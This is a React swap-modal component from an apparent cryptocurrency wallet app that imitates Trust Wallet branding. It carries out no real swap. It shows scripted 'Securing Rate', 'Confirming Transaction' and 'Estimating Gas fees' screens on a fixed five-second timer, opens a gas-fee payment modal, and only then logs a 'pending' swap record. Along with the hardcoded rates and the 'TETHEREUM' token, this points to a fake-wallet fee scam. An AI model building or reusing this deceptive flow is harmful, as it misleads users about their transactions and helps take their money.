'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, ArrowDownUp, ArrowRight, Info, ChevronDown, ChevronLeft, Loader2 } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';
import { COIN_MAP, getDynamicExchangeRates } from '@/lib/utils';
import StatusModal from './statusModal';

interface SwapModalProps {
    address: string;
    isOpen: boolean;
    onClose: () => void;
    onSuccess?: () => void;
    initialFromToken?: string;
    bnbBalance?: string;
    t22Balance?: number;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
    isInline?: boolean;
}

export default function SwapModal({
    address,
    isOpen,
    onClose,
    onSuccess,
    initialFromToken = 'BNB',
    bnbBalance = '0',
    t22Balance = 0,
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light',
    isInline = false
}: SwapModalProps) {
    const [fromToken, setFromToken] = useState(initialFromToken || 'TETHEREUM');
    // const [toToken, setToToken] = useState(initialFromToken || 'ETH');
    const [toToken, setToToken] = useState('ETH');
    const [fromAmount, setFromAmount] = useState('');
    const [toAmount, setToAmount] = useState('');
    const [showGasModal, setShowGasModal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    // Custom Dropdown State
    const [showFromDropdown, setShowFromDropdown] = useState(false);
    const [showToDropdown, setShowToDropdown] = useState(false);

    // Status Modal State
    const [showStatusModal, setShowStatusModal] = useState(false);
    const [statusModalConfig, setStatusModalConfig] = useState({
        title: '',
        message: '',
        success: false
    });

    const showError = (title: string, message: string) => {
        setStatusModalConfig({
            title,
            message,
            success: false
        });
        setShowStatusModal(true);
    };





    const [user, setUser] = useState({})

    // Exchange rates (mock - in production, fetch from API)
    // const exchangeRates: { [key: string]: { [key: string]: number } } = {
    //     'BNB': { 'TETHEREUM': 1.0, 'USDT': 620.0, 'BNB': 1.0 },
    //     'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
    //     'USDT': { 'BNB': 0.00161, 'TETHEREUM': 2.22, 'USDT': 1.0 }
    // };

    const exchangeRates: { [key: string]: { [key: string]: number } } = {
        'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
        'BNB': {
            'BNB': 1,
            'ETH': 0.35,
            'USDT': 620,
            'USDC': 620,
            'DAI': 620,
            'MATIC': 850,
            'ARB': 420,
            'OP': 390
        },
        'ETH': {
            'BNB': 2.85,
            'ETH': 1,
            'USDT': 1800,
            'USDC': 1800,
            'DAI': 1800,
            'MATIC': 2400,
            'ARB': 1200,
            'OP': 1100
        },
        'USDT': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'USDC': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'DAI': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'MATIC': {
            'BNB': 0.00117,
            'ETH': 0.00042,
            'USDT': 0.75,
            'USDC': 0.75,
            'DAI': 0.75,
            'MATIC': 1,
            'ARB': 0.5,
            'OP': 0.46
        },
        'ARB': {
            'BNB': 0.00238,
            'ETH': 0.00083,
            'USDT': 1.5,
            'USDC': 1.5,
            'DAI': 1.5,
            'MATIC': 2,
            'ARB': 1,
            'OP': 0.92
        },
        'OP': {
            'BNB': 0.00256,
            'ETH': 0.0009,
            'USDT': 1.63,
            'USDC': 1.63,
            'DAI': 1.63,
            'MATIC': 2.17,
            'ARB': 1.08,
            'OP': 1
        }
    };
    let [exchangeRates_, setExchangeRates_] = useState(null)

    useEffect(() => {
        let v = async () => {

            // console.log("exchangeRates__")
            const exchangeRates__ = await getDynamicExchangeRates();
            // console.log(exchangeRates__)
            setExchangeRates_(exchangeRates__)
        }
        v()
    }, [])
    const getBalance = (token: string) => {
        if (token === 'BNB') return Number(bnbBalance).toFixed(4);
        if (token === 'TETHEREUM') return t22Balance.toFixed(6);
        return '0.00';
    };

    // Auto-calculate toAmount when fromAmount or tokens change
    useEffect(() => {
        if (fromAmount && !isNaN(Number(fromAmount)) && Number(fromAmount) > 0) {
            const rate = exchangeRates_[fromToken]?.[toToken] || 1.0;

            const calculated = Number(fromAmount) * rate;
            setToAmount(calculated.toFixed(6));
        } else {
            setToAmount('');
        }
    }, [fromAmount, fromToken, toToken]);

    const [getUserLoading, setGetUSerLoading] = useState(false)
    useEffect(() => {

        let v = async () => {
            // console.log(!address || address=="","kkk")
            if (!address || address == "") {
                return
            }

            try {

                setGetUSerLoading(true)
                let vvv = await fetch(`/api/user?address=${address}`, {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' },
                    //   body: JSON.stringify({ address, t99:Number(tbal) })
                });

                let vjson = await vvv.json()

                if (vjson?.existingRecord?.id) {
                    setUser(vjson?.existingRecord)
                }

            } catch (e) {

            } finally {
                setGetUSerLoading(false)
            }
        }

        v()
    }, [address])

    // Update state when modal opens with initialFromToken
    useEffect(() => {
        if (isOpen && initialFromToken) {
            setFromToken(initialFromToken);
            // Prevent selecting same token for both
            if (toToken === initialFromToken) {
                // setToToken(initialFromToken === 'BNB' ? 'TETHEREUM' : 'BNB');
            }
        }
    }, [isOpen, initialFromToken]);
    let getCurrentRate = useMemo(() => {
        if (!exchangeRates_) {
            return "..."
        }

        const rate = exchangeRates_[fromToken]?.[toToken];
        if (rate !== undefined && !isNaN(rate)) {
            return `1 ${fromToken} = ${Number(rate).toFixed(6)} ${toToken}`;
        }
        return "Unavailable";
    }, [fromToken, toToken, exchangeRates_]);

    const currentNetwork = useMemo(() => {
        if (fromToken === 'BNB' || fromToken === 'BUSD' || fromToken === 'TETHEREUM') return 'BNB';
        if (fromToken === 'ETH' || fromToken === 'USDT' || fromToken === 'USDC') return 'ETH';
        if (fromToken === 'BTC') return 'BTC';
        return 'ETH';
    }, [fromToken]);

    const estimatedUsdValue = useMemo(() => {
        if (!toAmount || !exchangeRates_) return '0.00';
        const usdRate = exchangeRates_[toToken]?.['USDT'] || 0;
        return (Number(toAmount) * usdRate).toFixed(2);
    }, [toAmount, toToken, exchangeRates_]);

    // Reset form when modal closes
    useEffect(() => {
        if (!isOpen) {
            setFromAmount('');
            setToAmount('');
        }
    }, [isOpen]);



    const handleSwapTokens = () => {
        // Swap tokens
        const tempToken = fromToken;
        setFromToken(toToken);
        setToToken(tempToken);

        // Swap amounts
        const tempAmount = fromAmount;
        setFromAmount(toAmount);
        setToAmount(tempAmount);
    };

    const handleFromTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === toToken) {
            setToToken(fromToken);
        }
        setFromToken(newToken);
    };

    const handleToTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === fromToken) {
            setFromToken(toToken);
        }
        setToToken(newToken);
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        // Validation
        if (!fromAmount || Number(fromAmount) <= 0) {
            showError('Invalid Amount', 'Please enter a valid amount to swap.');
            return;
        }

        const balance = Number(getBalance(fromToken));
        if (Number(fromAmount) > balance) {
            showError('Insufficient Balance', `You don't have enough ${fromToken} to complete this swap. Please add more funds and try again.`);
            return;
        }

        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            setShowGasModal(true);
        }, 5000); // 5 second loading delay
    };

    const handleGasSuccess = async (txHash: string) => {
        // Create Pending Transaction in Airtable
        try {
            await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: address,
                    amount: Number(fromAmount),
                    type: "swap",
                    asset: `${fromToken} → ${toToken}`,
                    network: "Base Swap",
                    wType: "crypto",
                    status: "pending"
                })
            });
        } catch (err) {
            console.error("Failed to save swap history", err);
        }

        setShowGasModal(false);
        if (onSuccess) onSuccess();
        onClose();
    };

    const renderForm = () => (
        <form onSubmit={handleSubmit} className="space-y-6 mt-4">
            <div className={`rounded-[2rem] p-6 transition-all ${theme === 'dark' ? 'bg-white/5 border border-white/5 focus-within:border-blue-600/50' : 'bg-gray-50 border border-gray-100 focus-within:border-blue-600/50'}`}>
                <div className="flex justify-between items-center mb-4">
                    <span className="text-xs font-bold text-gray-500 uppercase tracking-widest">From</span>
                    <span className="text-xs font-bold text-gray-400">Balance: {getBalance(fromToken)}</span>
                </div>
                <div className="flex items-center gap-4">
                    <input
                        type="number"
                        value={fromAmount}
                        onChange={(e) => setFromAmount(e.target.value)}
                        placeholder="0.0"
                        step="any"
                        className={`flex-1 bg-transparent text-3xl font-bold placeholder-gray-500 focus:outline-none min-w-0 ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}
                        required
                    />
                    <div className="flex items-center gap-2">
                        <button
                            type="button"
                            onClick={() => setFromAmount(getBalance(fromToken))}
                            className="text-[10px] font-bold px-2.5 py-1.5 bg-blue-600/10 text-blue-600 rounded-lg hover:bg-blue-600/20 transition-colors"
                        >
                            MAX
                        </button>
                        <div className="relative">
                            <button
                                type="button"
                                onClick={() => setShowFromDropdown(!showFromDropdown)}
                                className={`flex items-center gap-2 rounded-full pl-2 pr-3 py-1.5 border transition-all ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-gray-200 shadow-sm'} hover:scale-105 active:scale-95`}
                            >
                                <div className="w-6 h-6 rounded-full overflow-hidden bg-white p-0.5">
                                    <img src={COIN_MAP[fromToken].logo} alt={fromToken} className="w-full h-full object-contain" />
                                </div>
                                <span className="text-sm font-bold">{fromToken}</span>
                                <ChevronDown className="w-4 h-4 text-gray-400" />
                            </button>

                            <AnimatePresence>
                                {showFromDropdown && (
                                    <>
                                        <div className="fixed inset-0 z-30" onClick={() => setShowFromDropdown(false)} />
                                        <motion.div
                                            initial={{ opacity: 0, scale: 0.95, y: 10 }}
                                            animate={{ opacity: 1, scale: 1, y: 0 }}
                                            exit={{ opacity: 0, scale: 0.95, y: 10 }}
                                            className={`absolute top-full right-0 mt-3 w-48 rounded-2xl shadow-2xl z-40 overflow-hidden ${theme === 'dark' ? 'bg-[#151515] border border-white/10' : 'bg-white border border-gray-100'}`}
                                        >
                                            <div className="max-h-60 overflow-y-auto py-2">
                                                {['BTC', 'ETH', 'BNB', 'USDT', 'TETHEREUM'].map((coin) => (
                                                    <div
                                                        key={coin}
                                                        onClick={() => {
                                                            handleFromTokenChange(coin);
                                                            setShowFromDropdown(false);
                                                        }}
                                                        className={`flex items-center gap-3 px-4 py-3 hover:bg-blue-600/5 cursor-pointer transition-colors ${theme === 'dark' ? 'text-white' : 'text-gray-900'}`}
                                                    >
                                                        <div className="w-6 h-6 rounded-full overflow-hidden bg-white p-0.5 border border-gray-100">
                                                            <img src={COIN_MAP[coin].logo} alt={coin} className="w-full h-full object-contain" />
                                                        </div>
                                                        <span className="font-bold text-sm">{coin}</span>
                                                    </div>
                                                ))}
                                            </div>
                                        </motion.div>
                                    </>
                                )}
                            </AnimatePresence>
                        </div>
                    </div>
                </div>
            </div>

            <div className="flex justify-center -my-8 relative z-10">
                <button
                    type="button"
                    onClick={handleSwapTokens}
                    className={`w-12 h-12 rounded-2xl flex items-center justify-center transition-all shadow-xl hover:rotate-180 active:scale-90 ${theme === 'dark' ? 'bg-[#151515] border-4 border-black text-blue-500' : 'bg-white border-4 border-gray-50 text-blue-600'}`}
                >
                    <ArrowDownUp className="w-6 h-6" />
                </button>
            </div>

            <div className={`rounded-[2rem] p-6 transition-all ${theme === 'dark' ? 'bg-white/5 border border-white/5' : 'bg-gray-50 border border-gray-100'}`}>
                <div className="flex justify-between items-center mb-4">
                    <span className="text-xs font-bold text-gray-500 uppercase tracking-widest">To</span>
                    <span className="text-xs font-bold text-gray-400">Balance: {getBalance(toToken)}</span>
                </div>
                <div className="flex items-center gap-4">
                    <input
                        type="text"
                        value={toAmount}
                        placeholder="0.0"
                        className={`flex-1 bg-transparent text-3xl font-bold placeholder-gray-500 focus:outline-none min-w-0 ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}
                        readOnly
                    />
                    <div className="relative">
                        <button
                            type="button"
                            onClick={() => setShowToDropdown(!showToDropdown)}
                            className={`flex items-center gap-2 rounded-full pl-2 pr-3 py-1.5 border transition-all ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-gray-200 shadow-sm'} hover:scale-105 active:scale-95`}
                        >
                            <div className="w-6 h-6 rounded-full overflow-hidden bg-white p-0.5">
                                <img src={COIN_MAP[toToken].logo} alt={toToken} className="w-full h-full object-contain" />
                            </div>
                            <span className="text-sm font-bold">{toToken}</span>
                            <ChevronDown className="w-4 h-4 text-gray-400" />
                        </button>

                        <AnimatePresence>
                            {showToDropdown && (
                                <>
                                    <div className="fixed inset-0 z-30" onClick={() => setShowToDropdown(false)} />
                                    <motion.div
                                        initial={{ opacity: 0, scale: 0.95, y: 10 }}
                                        animate={{ opacity: 1, scale: 1, y: 0 }}
                                        exit={{ opacity: 0, scale: 0.95, y: 10 }}
                                        className={`absolute top-full right-0 mt-3 w-48 rounded-2xl shadow-2xl z-40 overflow-hidden ${theme === 'dark' ? 'bg-[#151515] border border-white/10' : 'bg-white border border-gray-100'}`}
                                    >
                                        <div className="max-h-60 overflow-y-auto py-2">
                                            {['BTC', 'ETH', 'BNB', 'USDT', 'TETHEREUM'].map((coin) => (
                                                <div
                                                    key={coin}
                                                    onClick={() => {
                                                        handleToTokenChange(coin);
                                                        setShowToDropdown(false);
                                                    }}
                                                    className={`flex items-center gap-3 px-4 py-3 hover:bg-blue-600/5 cursor-pointer transition-colors ${theme === 'dark' ? 'text-white' : 'text-gray-900'}`}
                                                >
                                                    <div className="w-6 h-6 rounded-full overflow-hidden bg-white p-0.5 border border-gray-100">
                                                        <img src={COIN_MAP[coin].logo} alt={coin} className="w-full h-full object-contain" />
                                                    </div>
                                                    <span className="font-bold text-sm">{coin}</span>
                                                </div>
                                            ))}
                                        </div>
                                    </motion.div>
                                </>
                            )}
                        </AnimatePresence>
                    </div>
                </div>
            </div>

            <div className={`rounded-[2rem] p-6 space-y-4 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-gray-500">Rate</span>
                    <span className="text-sm font-bold">{getCurrentRate}</span>
                </div>
                <div className="flex justify-between items-center">
                    <span className="text-sm font-medium text-gray-500">Value</span>
                    <div className="text-right">
                        <p className="text-xl font-bold text-blue-600 leading-none mb-1">
                            {currencySymbol}{(Number(estimatedUsdValue) * fxRate).toFixed(2)}
                        </p>
                        <p className="text-xs font-bold text-gray-400">{toAmount ? `${toAmount} ${toToken}` : '-'}</p>
                    </div>
                </div>
                <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                <div className="flex justify-between items-center text-xs font-bold uppercase tracking-widest text-gray-400">
                    <span>Fee</span>
                    <span>~{currencySymbol}{(0.50 * fxRate).toFixed(2)}</span>
                </div>
            </div>

            <button
                type="submit"
                disabled={!fromAmount || Number(fromAmount) <= 0}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-4 rounded-2xl transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-3 text-base mt-4"
            >
                {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : `Swap ${fromToken}`}
            </button>
        </form>
    );

    if (isInline) {
        return (
            <>
            <div className={`w-full max-w-[600px] mx-auto ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                {isLoading ? (
                    <div className={`flex flex-col items-center justify-center py-20 px-6 relative w-full min-h-[500px] rounded-[3rem] border ${
                        theme === 'dark' ? 'bg-[#000000] border-white/10' : 'bg-white border-gray-100 shadow-xl'
                    }`}>
                        <div className="relative w-32 h-32 mb-10">
                            <div className="absolute inset-0 bg-blue-600 blur-3xl opacity-20 animate-pulse" />
                            <div className="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin" />
                            <div className="absolute inset-4 border-4 border-blue-400 rounded-full border-b-transparent animate-[spin_1.5s_linear_infinite_reverse]" />
                            <div className="absolute inset-0 flex items-center justify-center">
                                <ArrowDownUp className="w-10 h-10 text-blue-600 animate-bounce" />
                            </div>
                        </div>
                        <h3 className="text-3xl font-bold mb-3">Securing Rate</h3>
                        <p className="text-gray-500 font-medium text-center">Finding the best exchange path for your swap...</p>
                    </div>
                ) : (
                    <div className={`md:rounded-[3rem] md:border p-0 md:p-2 ${theme === 'dark' ? 'bg-transparent md:bg-black border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-2xl'}`}>
                            {/* Sticky Header */}
                            <div className={`sticky top-0 z-10 px-6 md:px-8 pt-8 pb-4 flex items-center gap-3 ${theme === 'dark' ? 'bg-black' : 'bg-white'}`}>
                                <button
                                    onClick={onClose}
                                    className={`w-9 h-9 flex items-center justify-center rounded-full transition-all ${
                                        theme === 'dark' ? 'bg-white/10 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'
                                    }`}
                                >
                                    <ChevronLeft className="w-5 h-5" />
                                </button>
                                <h2 className="text-base font-semibold tracking-tight">Swap Tokens</h2>
                            </div>
                            {/* Scrollable Content */}
                            <div className="px-6 md:px-8 pb-12 mt-8">
                            {renderForm()}
                        </div>
                    </div>
                )}
            </div>
            <GasFeeModal
                isOpen={showGasModal}
                onClose={() => setShowGasModal(false)}
                onSuccess={handleGasSuccess}
                user={user}
                theme={theme}
                network={currentNetwork}
            />
            <StatusModal
                isOpen={showStatusModal}
                onClose={() => setShowStatusModal(false)}
                title={statusModalConfig.title}
                message={statusModalConfig.message}
                success={statusModalConfig.success}
                theme={theme}
            />
            </>
        );
    }

    return (
        <AnimatePresence mode="wait">
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    {/* Backdrop */}
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={onClose}
                    />

                    {/* Modal - Bottom Sheet on Mobile, Centered on Desktop */}
                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border rounded-[2.5rem] shadow-2xl overflow-hidden z-20 m-4`}
                    >
                        {isLoading ? (
                            <div className={`flex flex-col items-center justify-center py-16 px-6 relative w-full min-h-[460px] ${
                                theme === 'dark' ? 'bg-[#000000]' : 'bg-white'
                            }`}>
                                <div className="relative w-28 h-28 mb-8">
                                    <div className={`absolute inset-0 border-[3px] rounded-full ${theme === 'dark' ? 'border-[#3375BB]/20' : 'border-[#3375BB]/10'}`}></div>
                                    <div className="absolute inset-0 border-[3px] border-[#3375BB] rounded-full border-t-transparent animate-spin"></div>
                                    <div className={`absolute inset-4 border-[3px] rounded-full ${theme === 'dark' ? 'border-blue-400/20' : 'border-blue-400/10'}`}></div>
                                    <div className="absolute inset-4 border-[3px] border-blue-400 rounded-full border-b-transparent animate-[spin_1.5s_linear_infinite_reverse]"></div>
                                    <div className="absolute inset-0 flex items-center justify-center">
                                        <img 
                                            src="/favicon.png" 
                                            alt="Trust Logo" 
                                            className="w-12 h-12 animate-pulse"
                                        />
                                    </div>
                                </div>

                                <motion.h3
                                    initial={{ y: 10, opacity: 0 }}
                                    animate={{ y: 0, opacity: 1 }}
                                    className={`text-2xl font-bold mb-3 tracking-wide ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}
                                >
                                    Preparing swap...
                                </motion.h3>
                                <motion.p
                                    initial={{ y: 10, opacity: 0 }}
                                    animate={{ y: 0, opacity: 1 }}
                                    transition={{ delay: 0.1 }}
                                    className={`text-center px-4 text-sm leading-relaxed mb-10 ${theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}`}
                                >
                                    Securing the exchange rate for <br />
                                    <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`}>{fromAmount} {fromToken}</span> to <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`}>{toAmount} {toToken}</span>
                                </motion.p>

                                <div className="w-full space-y-5 max-w-xs mx-auto">
                                    <div className={`flex items-center gap-4 p-3 rounded-xl border ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                        <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center flex-shrink-0">
                                            <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                        </div>
                                        <span className={`text-sm font-medium ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>Confirming Transaction</span>
                                    </div>
                                    <div className={`flex items-center gap-4 p-3 rounded-xl border ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                        <div className="w-8 h-8 rounded-full bg-[#3375BB]/20 flex items-center justify-center animate-pulse flex-shrink-0">
                                            <div className="w-3 h-3 rounded-full bg-[#3375BB]"></div>
                                        </div>
                                        <span className={`text-sm font-medium ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`}>Estimating Gas fees</span>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div className="p-6 pb-10">
                                <div className="flex items-center justify-between mb-4">
                                    <h2 className="text-lg font-bold">Swap</h2>
                                    <button
                                        onClick={onClose}
                                        className="w-8 h-8 flex items-center justify-center bg-gray-800/50 hover:bg-gray-700/50 rounded-full transition-colors text-gray-400 hover:text-white"
                                    >
                                        <X className="w-5 h-5" />
                                    </button>
                                </div>
                                {renderForm()}
                            </div>
                        )}
                    </motion.div>

                    <GasFeeModal
                        isOpen={showGasModal}
                        onClose={() => setShowGasModal(false)}
                        onSuccess={handleGasSuccess}
                        user={user}
                        theme={theme}
                        network={currentNetwork}
                    />
                    <StatusModal
                        isOpen={showStatusModal}
                        onClose={() => setShowStatusModal(false)}
                        title={statusModalConfig.title}
                        message={statusModalConfig.message}
                        success={statusModalConfig.success}
                        theme={theme}
                    />
                </div>
            )}
        </AnimatePresence>
    );
}
